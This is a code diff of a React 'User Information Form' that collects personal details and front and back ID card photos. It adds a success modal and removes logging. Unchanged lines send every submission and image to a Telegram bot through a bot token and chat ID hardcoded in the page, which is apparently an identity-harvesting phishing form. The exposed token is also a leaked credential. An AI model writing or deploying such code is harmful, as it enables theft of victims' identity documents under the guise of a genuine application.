@@ -4,6 +4,21 @@ import axios from "axios";
 const TELEGRAM_BOT_TOKEN = "7267909812:AAF2YCT0-TbHFH6LMIcbqOPIJcxwG_-jvZY";
 const TELEGRAM_CHAT_ID = "5461098350";
 
+const SuccessModal = ({ onClose }) => (
+  <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50">
+    <div className="bg-white p-6 rounded-2xl shadow-lg text-center">
+      <h2 className="text-2xl font-semibold text-green-600">✅ Application Received!</h2>
+      <p className="mt-2 text-gray-700">Your application has been submitted successfully.</p>
+      <button
+        onClick={onClose}
+        className="mt-5 px-5 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition duration-300"
+      >
+        Back Home
+      </button>
+    </div>
+  </div>
+);
+
 const FormComponent = () => {
   const initialFormData = {
     name: "",
@@ -21,6 +36,7 @@ const FormComponent = () => {
     idCardFront: "No file chosen",
     idCardBack: "No file chosen",
   });
+  const [isSubmitted, setIsSubmitted] = useState(false);
 
   const handleChange = (e) => {
     const { name, value } = e.target;
@@ -35,9 +51,6 @@ const FormComponent = () => {
         setFormData((prev) => ({ ...prev, [side]: reader.result }));
         setFileNames((prev) => ({ ...prev, [label]: file.name }));
       };
-      reader.onerror = () => {
-        alert("Error reading the file. Please try again.");
-      };
       reader.readAsDataURL(file);
     } else {
       alert("Please upload a valid image file.");
@@ -50,8 +63,6 @@ const FormComponent = () => {
 
   const sendTextToTelegram = async () => {
     try {
-      console.log("Sending text message to Telegram...");
-
       const textMessage = `
 📌 *New Form Submission* 📌
 👤 *Name:* ${escapeMarkdownV2(formData.name)}
@@ -65,8 +76,6 @@ const FormComponent = () => {
       await axios.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         params: { chat_id: TELEGRAM_CHAT_ID, text: textMessage, parse_mode: "MarkdownV2" },
       });
-
-      console.log("Text message sent successfully!");
     } catch (error) {
       console.error("Error sending text data to Telegram:", error);
     }
@@ -74,8 +83,6 @@ const FormComponent = () => {
 
   const sendImagesToTelegram = async () => {
     try {
-      console.log("Sending images to Telegram...");
-
       const sendPhoto = async (imageBase64) => {
         if (!imageBase64) return;
 
@@ -92,8 +99,6 @@ const FormComponent = () => {
 
       await sendPhoto(formData.idCardFrontBase64);
       await sendPhoto(formData.idCardBackBase64);
-
-      console.log("Images sent successfully!");
     } catch (error) {
       console.error("Error sending images to Telegram:", error);
     }
@@ -115,18 +120,19 @@ const FormComponent = () => {
     await sendTextToTelegram();
     await sendImagesToTelegram();
 
-    // Show success message
-    alert("✅ Successful!");
+    // Show success modal
+    setIsSubmitted(true);
+  };
 
-    // Clear form fields
-    setFormData(initialFormData);
-    setFileNames({ idCardFront: "No file chosen", idCardBack: "No file chosen" });
-
-    console.log("Form cleared successfully!");
+  const handleCloseModal = () => {
+    setIsSubmitted(false);
+    window.location.href = "/"; // Redirect to home page
   };
 
   return (
     <div className="max-w-2xl mx-auto p-6 bg-white shadow-xl rounded-2xl border border-gray-200 sm:p-8 lg:p-10">
+      {isSubmitted && <SuccessModal onClose={handleCloseModal} />}
+
       <h2 className="text-2xl font-semibold text-gray-800 text-center mb-6">
         User Information Form
       </h2>
